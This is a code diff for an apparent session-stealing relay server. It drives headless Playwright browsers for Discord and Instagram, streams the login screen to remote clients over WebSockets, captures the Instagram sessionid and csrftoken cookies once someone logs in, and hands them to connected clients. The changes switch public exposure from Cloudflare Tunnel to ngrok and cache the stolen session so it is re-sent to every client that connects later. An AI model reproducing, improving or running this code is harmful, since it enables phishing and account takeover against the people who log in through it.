@@ -12,10 +12,10 @@
 //   ws://localhost:3000/stream?type=discord
 //   ws://localhost:3000/stream?type=instagram
 //
-// Expose with Cloudflare Tunnel:
-//   cloudflared tunnel --url http://localhost:3000
+// Expose with ngrok:
+//   ngrok http 3000
 //
-// Then add the trycloudflare.com URL to PLAYWRIGHT_MIRRORS
+// Then add the ngrok URL to PLAYWRIGHT_MIRRORS
 // in index.js and insta/index.js
 // ══════════════════════════════════════════════════════════
 
@@ -72,6 +72,7 @@ const SVC = {
         browser: null, page: null,
         screenshotInterval: null,
         tokenCaptured: false,
+        capturedSession: null,
         clients: new Set()
     }
 };
@@ -132,7 +133,12 @@ wss.on('connection', (ws, req) => {
         await handleInput(svc, msg);
     });
 
-    send(ws, { type: 'status', text: svc.tokenCaptured ? 'Login already completed' : 'Connected — log in to continue' });
+    if (svc.tokenCaptured && svc.capturedSession) {
+        // Re-deliver cached session to clients that lost their localStorage
+        send(ws, { type: 'session', ...svc.capturedSession });
+        return;
+    }
+    send(ws, { type: 'status', text: 'Connected — log in to continue' });
 
     if (svc.page && !svc.tokenCaptured) {
         svc.page.screenshot({ type: 'jpeg', quality: SCREENSHOT_QUALITY })
@@ -234,9 +240,10 @@ function setupInstagramCapture(svc) {
             const csrfCookie    = cookies.find(c => c.name === 'csrftoken');
             if (sessionCookie?.value) {
                 svc.tokenCaptured = true;
+                svc.capturedSession = { sessionId: sessionCookie.value, csrfToken: csrfCookie?.value || '' };
                 stopScreenshots(svc);
                 console.log('[instagram] Session captured!');
-                broadcast(svc, { type: 'session', sessionId: sessionCookie.value, csrfToken: csrfCookie?.value || '' });
+                broadcast(svc, { type: 'session', ...svc.capturedSession });
                 setTimeout(() => closeBrowser(svc, 'instagram'), 3000);
             }
         } catch (_) {}
@@ -300,7 +307,7 @@ server.listen(PORT, async () => {
     console.log(`  Discord   → ws://localhost:${PORT}/stream?type=discord`);
     console.log(`  Instagram → ws://localhost:${PORT}/stream?type=instagram`);
     console.log(`  Status    → http://localhost:${PORT}/status`);
-    console.log(`\nExpose with: cloudflared tunnel --url http://localhost:${PORT}\n`);
+    console.log(`\nExpose with: ngrok http ${PORT}\n`);
 
     // Launch both browsers in parallel
     const results = await Promise.allSettled([
